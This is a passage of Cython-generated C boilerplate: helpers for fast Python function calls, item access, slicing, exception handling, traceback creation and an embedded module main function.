    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* SliceObject */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
